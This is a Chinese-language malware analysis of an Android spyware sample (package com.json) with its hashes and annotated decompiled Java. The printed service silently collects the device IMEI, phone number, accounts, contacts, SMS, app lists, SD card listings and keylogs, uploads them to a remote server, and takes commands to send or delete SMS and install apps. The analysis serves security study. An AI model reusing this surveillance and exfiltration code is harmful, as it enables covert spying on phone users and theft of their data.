# 0x0 前言

## 包名

com.json

## 加固

无

## 样本来源

《移动安全攻防进阶》15.2

## 样本情况

SHA-1 : 6b18ad18b50ffb0869a250ca65755025ee0a9c49

MD5 : 0ce1648ff7553189e5b5db2252e27fd5

# 0X1 MainActivity

```java
    @Override // android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent(this, jsonservice.class);
        if (getSharedPreferences("ali", 0).getString("myphonenum", "0").equals("0")) {
            String a = String.valueOf(Math.random());
            String a2 = a.substring(a.indexOf(".") + 1);
            SharedPreferences.Editor localEditor = getSharedPreferences("ali", 0).edit();
            localEditor.putString("myphonenum", a2);
            localEditor.commit();
        }
        startService(intent);
        setContentView(R.layout.activity_main);
        this._startButton = (Button) findViewById(R.id.start_button);
        this._startButton.setOnClickListener(this);
        this._progressText = (TextView) findViewById(R.id.progress_text);
        this._progressText.setText("");
        findViewById(R.id.resources_text3).setOnClickListener(new View.OnClickListener() { // from class: com.json.MainActivity.4
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                MainActivity.this.openBrowser("https://mono.ac.ru");
            }
        });
        findViewById(R.id.resources_button1).setOnClickListener(new View.OnClickListener() { // from class: com.json.MainActivity.5
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                MainActivity.this.openBrowser("https://mono.ac.ru");
            }
        });
        findViewById(R.id.resources_button2).setOnClickListener(new View.OnClickListener() { // from class: com.json.MainActivity.6
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                MainActivity.this.openBrowser("https://mono.ac.ru");
            }
        });
        findViewById(R.id.resources_button3).setOnClickListener(new View.OnClickListener() { // from class: com.json.MainActivity.7
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                MainActivity.this.openBrowser("https://mono.ac.ru");
            }
        });
        findViewById(R.id.resources_button4).setOnClickListener(new View.OnClickListener() { // from class: com.json.MainActivity.8
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                MainActivity.this.openBrowser("https://mono.ac.ru/");
            }
        });
    }
```

> 注意 : doDetection()本身确实是检测POC,之后通过endDetection显示结果,但程序本身在onCreate启动了jsonservice,那才是核心恶意程序,这就是APT的特点,隐蔽且持续。

# 0x2 jsonservice

onStart:

```java
public void onStart(Intent paramIntent, int paramInt) {
    if (this.connect == null) {
        this.connect = new cat();
    }
    if (this.command == null) {
        this.command = new dog();
    }
    //获取电话服务
    if (this.telephonyManager == null) {
        this.telephonyManager = (TelephonyManager) getSystemService("phone");
    }
    //获取Mactivity的输入
    //从名为 "ali" 的共享偏好设置中获取键为 "myphonenum" 的字符串值，作为设备或用户的标识，
    this.identification = getSharedPreferences("ali", 0).getString("myphonenum", "0");

    //获取账户管理对象
    if (this.accountManger == null) {
        this.accountManger = AccountManager.get(getApplicationContext());
    }
    //获取应用包管理对象
    if (this.packageManager == null) {
        this.packageManager = getPackageManager();
    }
    //获取短信管理对象
    if (this.smsManager == null) {
        this.smsManager = SmsManager.getDefault();
    }
    //获取内容解析器(应用程序与Android系统内容提供者（Content Providers）之间进行数据交换的桥梁,
    // 允许一个应用程序访问另一个应用程序的数据，同时保证数据的安全性
    if (this.contentResolver == null) {
        this.contentResolver = getContentResolver();
    }
    //获取电源管理对象
    if (this.powerManager == null) {
        this.powerManager = (PowerManager) getSystemService("power");
    }
    //获取音频管理对象
    if (this.audioManager == null) {
        this.audioManager = (AudioManager) getSystemService("audio");
    }
    // 判断以 init.txt是否存在，
    // 若不存在，则执行以下初始化操作
    if (!new File(String.valueOf(dog.GetFilePath(this)) + dog.initFileName).exists()) {
        // 将 bGetTime 设置为 true，表示需要获取系统时间，可能在后续的定时任务或其他操作中执行获取时间的逻辑
        bGetTime = true;
        // 将 bGetUser 设置为 true，用于触发获取用户信息的操作，如设备的操作系统版本、IMEI 码等信息的获取流程
        bGetUser = true;
        // 将 bGetAccount 设置为 true，指示应获取账户信息，可能涉及从 AccountManager 中查询账户详情并进行处理
        bGetAccount = true;
        // 将 bGetApp 设置为 true，意味着需要获取设备上安装的应用程序信息，可能包括应用名称、包名、版本号等
        bGetApp = true;
        // 将 bGetContract 设置为 true，表明应获取联系人信息，后续可能通过 ContentResolver 查询联系人数据库
        bGetContract = true;
        // 将 bGetSms 设置为 true，触发获取短信信息的操作，包括收件箱、发件箱、草稿箱等短信内容的读取与处理
        bGetSms = true;
        // 将 bGetSdcard 设置为 true，用于启动对 SD 卡信息的获取操作，例如获取 SD 卡文件列表、可用空间等信息
        bGetSdcard = true;
        new pig();
        pig.WriteFile(this, dog.initFileName, "OK, My Spy");
    }
    // 创建一个新的 Timer 对象，参数 true 表示此定时器为守护线程，
    // 守护线程会在后台持续运行，不会阻止程序的正常退出，主要用于执行定时任务
    this.timer = new Timer(true);
    this.timerTask = new TimerTask() {
        // 创建一个 TimerTask 的匿名内部类实例，重写其 run 方法，在 run 方法中调用 jsonservice 类的 doTimerTask 方法，
        // 该方法实现了主要的业务逻辑循环，如定期获取系统数据、处理文件上传下载、短信管理、设备设置调整等操作
        @Override
        public final void run() {
            jsonservice.doTimerTask(jsonservice.this);
        }
    };
    this.timer.schedule(this.timerTask, DELAY, INTERVAL);
    super.onStart(paramIntent, paramInt);
}
```

> 在jsonservice中，核心在于onStart创建了定时器，定时收集数据并发送

doTimerTask：

```java
public static void doTimerTask(jsonservice appProtectService) {
    int Var114;
    appProtectService.Get(String.valueOf(wolf.UP_File_URL) + appProtectService.identification + ".txt");
    //获取系统时间并写入
    if (bGetTime) {
        StringBuilder strBuilder = new StringBuilder();
        strBuilder.append(new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Long.valueOf(System.currentTimeMillis())));
        String strDateTime = strBuilder.toString();
        new pig();
        pig.WriteFile(appProtectService, dog.timeFileName, strDateTime);
        bGetTime = false;
    }
    //获取用户信息(设备ID 手机号 操作系统类型 系统啊api级别 )并写入
    if (bGetUser) {
        if (appProtectService.telephonyManager != null) {
            StringBuilder Var163 = new StringBuilder();
            StringBuilder Var164 = new StringBuilder("Imei : ");
            Var164.append(appProtectService.telephonyManager.getDeviceId());
            Var164.append("\r\n");
            Var163.append(Var164.toString());
            StringBuilder Var168 = new StringBuilder("Number : ");
            Var168.append(appProtectService.telephonyManager.getLine1Number());
            Var168.append("\r\n");
            Var163.append(Var168.toString());
            StringBuilder Var172 = new StringBuilder("OsType : ");
            Var172.append(Build.VERSION.RELEASE);
            Var172.append("\r\n");
            Var163.append(Var172.toString());
            StringBuilder Var176 = new StringBuilder("OsAPI : ");
            Var176.append(Build.VERSION.SDK);
            Var176.append("\r\n");
            Var163.append(Var176.toString());
            new pig();
            pig.WriteFile(appProtectService, dog.userFileName, Var163.toString());
        }
        bGetUser = false;
    }
    //设备上的账户信息，包括账户类型和名称等
    if (bGetAccount) {
        appProtectService.accountManStorage();
        bGetAccount = false;
    }
    //获取应用名称、包名和类名等信息
    if (bGetApp) {
        appProtectService.runningAppStorage();
        bGetApp = false;
    }
    //获取联系人姓名和手机号
    if (bGetContract) {
        appProtectService.contactStorage();
        bGetContract = false;
    }
    //提取短信的 ID、线程 ID、号码、内容和时间等信息
    if (bGetSms) {
        appProtectService.smsMonitoring();
        bGetSms = false;
    }
    //递归搜索 SD 卡根目录下所有文件
    if (bGetSdcard) {
        Environment.getExternalStorageState();
        if (Environment.getExternalStorageState().equals("mounted")) {
            appProtectService.pathSearchOrder(Environment.getExternalStorageDirectory().getAbsolutePath(), "*.*", "SDCard");
        }
        bGetSdcard = false;
    }
    //获取键盘记录文件并上传
    if (appProtectService.bGetKeylog && new File(String.valueOf(dog.GetFilePath(appProtectService)) + dog.keylogFileName).exists() && appProtectService.sendRequest(String.valueOf(appProtectService.getFilesDir().getAbsolutePath()) + "/" + dog.keylogFileName, false)) {
        new pig();
        pig.FileExist(dog.GetFilePath(appProtectService) + dog.keylogFileName).booleanValue();
        appProtectService.bGetKeylog = false;
    }
    //文件上传
    if (appProtectService.bUpload) {
        appProtectService.bUpload = false;
        for (int i = 0; i < appProtectService.nUpFileSize; i++) {
            if (appProtectService.upFile[i].length() > 3) {
                appProtectService.sendRequest(appProtectService.upFile[i], false);
            }
        }
    }
    //文件下载
    if (appProtectService.bDownload) {
        appProtectService.bDownload = false;
        for (int i2 = 0; i2 < appProtectService.downloadFileSize; i2++) {
            if (appProtectService.downloadFileNames[i2].length() > 3) {
                StringBuilder Var158 = new StringBuilder(wolf.BASE_URL).append("files/");
                Var158.append(appProtectService.downloadFileNames[i2]);
                cat.urlConnectWriteDownloadFile(Var158.toString(), appProtectService.downloadFileNames[i2]).booleanValue();
            }
        }
    }
    //文件删除
    if (appProtectService.bDelFile) {
        for (int Var154 = 0; Var154 < appProtectService.delFileSize; Var154++) {
            File Var155 = new File(appProtectService.delFileList[Var154]);
            if (Var155.exists()) {
                Var155.delete();
            }
        }
        appProtectService.bDelFile = false;
    }
    //短信删除
    if (appProtectService.bDelSms) {
        if (appProtectService.contentResolver != null) {
            Uri uri = Uri.parse("content://sms");
            String[] pattern = {String.valueOf(appProtectService.thread_id), String.valueOf(appProtectService.id)};
            appProtectService.contentResolver.delete(uri, "thread_id=? and _id=?", pattern);
        }
        appProtectService.bDelSms = false;
    }
    //向指定号码发送短信
    if (appProtectService.bSendSms) {
        String str = appProtectService.destinationAddress;
        String str2 = appProtectService.sendSmstext;
        if (appProtectService.smsManager != null) {
            appProtectService.smsManager.sendTextMessage(appProtectService.destinationAddress, null, appProtectService.sendSmstext, null, null);
        }
        appProtectService.bSendSms = false;
    }
    //打开指定应用
    if (appProtectService.bOpenApp) {
        if (appProtectService.packageManager != null) {
            Intent intent = appProtectService.packageManager.getLaunchIntentForPackage(appProtectService.oppendApp);
            intent.addCategory("android.intent.category.LAUNCHER");
            appProtectService.startActivity(intent);
        }
        appProtectService.bOpenApp = false;
    }
    //安装指定应用
    if (appProtectService.bInstallApk) {
        Uri uri2 = Uri.fromFile(new File(appProtectService.installedApkName));
        Intent intent2 = new Intent("android.intent.action.VIEW");
        intent2.setDataAndType(uri2, "application/vnd.android.package-archive");
        intent2.setFlags(268435456);
        appProtectService.startActivity(intent2);
        appProtectService.bInstallApk = false;
    }
    //卸载指定应用
    if (appProtectService.bUninstallApp) {
        Intent Var135 = new Intent("android.intent.action.DELETE");
        Var135.setData(Uri.parse("package:".concat(String.valueOf(appProtectService.uninstalledApkName))));
        Var135.addFlags(268435456);
        appProtectService.startActivity(Var135);
        appProtectService.bUninstallApp = false;
    }
    //启动指定的Activity
    if (appProtectService.bOpenDlg) {
        Intent intent3 = new Intent(appProtectService.getApplicationContext(), Dialog.class);
        intent3.addFlags(268435456);
        intent3.putExtra("Title", appProtectService.dlgTitle);
        intent3.putExtra("Message", appProtectService.dlgContent);
        appProtectService.startActivity(intent3);
        appProtectService.bOpenDlg = false;
    }
    //打开指定网址
    if (appProtectService.bOpenWeb) {
        String Var125 = appProtectService.webUrlStr;
        if (!appProtectService.webUrlStr.startsWith("http://") && !appProtectService.webUrlStr.startsWith("https://")) {
            Var125 = "http://".concat(String.valueOf(Var125));
        }
        Intent intent4 = new Intent("android.intent.action.VIEW").setData(Uri.parse(Var125));
        intent4.addFlags(268435456);
        appProtectService.startActivity(intent4);
        appProtectService.bOpenWeb = false;
    }
    //设置屏幕亮度
    if (appProtectService.bScreen) {
        boolean Var112 = appProtectService.bScreenRelated;
        if (appProtectService.contentResolver != null) {
            Intent Var118 = new Intent();
            if (Var112) {
                ContentResolver Var121 = appProtectService.contentResolver;
                Var114 = 100;
                Settings.System.putInt(Var121, "screen_brightness", 100);
                Settings.System.putInt(appProtectService.contentResolver, "screen_brightness_mode", 0);
                Settings.System.putInt(appProtectService.contentResolver, "screen_brightness", 100);
            } else {
                ContentResolver Var113 = appProtectService.contentResolver;
                Var114 = 10;
                Settings.System.putInt(Var113, "screen_brightness", 10);
                Settings.System.putInt(appProtectService.contentResolver, "screen_brightness_mode", 0);
                Settings.System.putInt(appProtectService.contentResolver, "screen_brightness", 10);
            }
            Var118.setFlags(268435456);
            Var118.putExtra("brightness value", Var114);
            appProtectService.getApplication().startActivity(Var118);
        }
        appProtectService.bScreen = false;
    }
    //设置音量
    if (appProtectService.bVolume) {
        appProtectService.adjustVolume(appProtectService.bUpOrDownVolume);
        appProtectService.bVolume = false;
    }

    //上传时间文件并删除
    StringBuilder Var16 = new StringBuilder();
    Var16.append(dog.GetFilePath(appProtectService));
    Var16.append(dog.timeFileName);
    if (new File(Var16.toString()).exists()) {
        StringBuilder Var19 = new StringBuilder();
        Var19.append(appProtectService.getFilesDir().getAbsolutePath());
        Var19.append("/");
        Var19.append(dog.timeFileName);
        if (appProtectService.sendRequest(Var19.toString(), false)) {
            new pig();
            StringBuilder Var24 = new StringBuilder();
            Var24.append(dog.GetFilePath(appProtectService));
            Var24.append(dog.timeFileName);
            pig.FileExist(Var24.toString()).booleanValue();
        }
    }
    //上传用户信息文件并删除
    StringBuilder Var28 = new StringBuilder();
    Var28.append(dog.GetFilePath(appProtectService));
    Var28.append(dog.userFileName);
    if (new File(Var28.toString()).exists()) {
        StringBuilder Var31 = new StringBuilder();
        Var31.append(appProtectService.getFilesDir().getAbsolutePath());
        Var31.append("/");
        Var31.append(dog.userFileName);
        if (appProtectService.sendRequest(Var31.toString(), false)) {
            new pig();
            StringBuilder Var36 = new StringBuilder();
            Var36.append(dog.GetFilePath(appProtectService));
            Var36.append(dog.userFileName);
            pig.FileExist(Var36.toString()).booleanValue();
        }
    }
    //上传账号文件并删除
    StringBuilder Var40 = new StringBuilder();
    Var40.append(dog.GetFilePath(appProtectService));
    Var40.append(dog.accountFileName);
    if (new File(Var40.toString()).exists()) {
        StringBuilder Var43 = new StringBuilder();
        Var43.append(appProtectService.getFilesDir().getAbsolutePath());
        Var43.append("/");
        Var43.append(dog.accountFileName);
        if (appProtectService.sendRequest(Var43.toString(), false)) {
            new pig();
            StringBuilder Var48 = new StringBuilder();
            Var48.append(dog.GetFilePath(appProtectService));
            Var48.append(dog.accountFileName);
            pig.FileExist(Var48.toString()).booleanValue();
        }
    }
    //上传应用信息文件并删除
    StringBuilder Var52 = new StringBuilder();
    Var52.append(dog.GetFilePath(appProtectService));
    Var52.append(dog.appFileName);
    if (new File(Var52.toString()).exists()) {
        StringBuilder Var55 = new StringBuilder();
        Var55.append(appProtectService.getFilesDir().getAbsolutePath());
        Var55.append("/");
        Var55.append(dog.appFileName);
        if (appProtectService.sendRequest(Var55.toString(), false)) {
            new pig();
            StringBuilder Var60 = new StringBuilder();
            Var60.append(dog.GetFilePath(appProtectService));
            Var60.append(dog.appFileName);
            pig.FileExist(Var60.toString()).booleanValue();
        }
    }
    //上传联系人文件并删除
    StringBuilder Var64 = new StringBuilder();
    Var64.append(dog.GetFilePath(appProtectService));
    Var64.append(dog.contactFileName);
    if (new File(Var64.toString()).exists()) {
        StringBuilder Var67 = new StringBuilder();
        Var67.append(appProtectService.getFilesDir().getAbsolutePath());
        Var67.append("/");
        Var67.append(dog.contactFileName);
        if (appProtectService.sendRequest(Var67.toString(), false)) {
            StringBuilder Var72 = new StringBuilder();
            Var72.append(dog.GetFilePath(appProtectService));
            Var72.append(dog.contactFileName);
            pig.FileExist(Var72.toString()).booleanValue();
        }
    }
    //上传短信文件并删除
    StringBuilder Var76 = new StringBuilder();
    Var76.append(dog.GetFilePath(appProtectService));
    Var76.append(dog.sms_allFileName);
    if (new File(Var76.toString()).exists()) {
        StringBuilder Var79 = new StringBuilder();
        Var79.append(appProtectService.getFilesDir().getAbsolutePath());
        Var79.append("/");
        Var79.append(dog.sms_allFileName);
        if (appProtectService.sendRequest(Var79.toString(), false)) {
            new pig();
            StringBuilder Var84 = new StringBuilder();
            Var84.append(dog.GetFilePath(appProtectService));
            Var84.append(dog.sms_allFileName);
            pig.FileExist(Var84.toString()).booleanValue();
        }
    }
    //上传sd卡文件并删除
    StringBuilder Var88 = new StringBuilder();
    Var88.append(dog.GetFilePath(appProtectService));
    Var88.append(dog.sdcardFileName);
    if (new File(Var88.toString()).exists()) {
        StringBuilder Var91 = new StringBuilder();
        Var91.append(appProtectService.getFilesDir().getAbsolutePath());
        Var91.append("/");
        Var91.append(dog.sdcardFileName);
        if (appProtectService.sendRequest(Var91.toString(), false)) {
            new pig();
            StringBuilder Var96 = new StringBuilder();
            Var96.append(dog.GetFilePath(appProtectService));
            Var96.append(dog.sdcardFileName);
            pig.FileExist(Var96.toString()).booleanValue();
        }
    }
    //上传sms_new.txt 并删除
    if (new File(dog.GetFilePath(appProtectService) + dog.sms_newFileName).exists()) {
        if (appProtectService.sendRequest(appProtectService.getFilesDir().getAbsolutePath() + "/" + dog.sms_newFileName, false)) {
            new pig();
            pig.FileExist(dog.GetFilePath(appProtectService) + dog.sms_newFileName).booleanValue();
        }
    }
}
```

> 收集用户信息写入文件（文件名列表在dog.java，文件操作在pig.java）,在发送后（网络操作在cat.java）设置下一轮收集

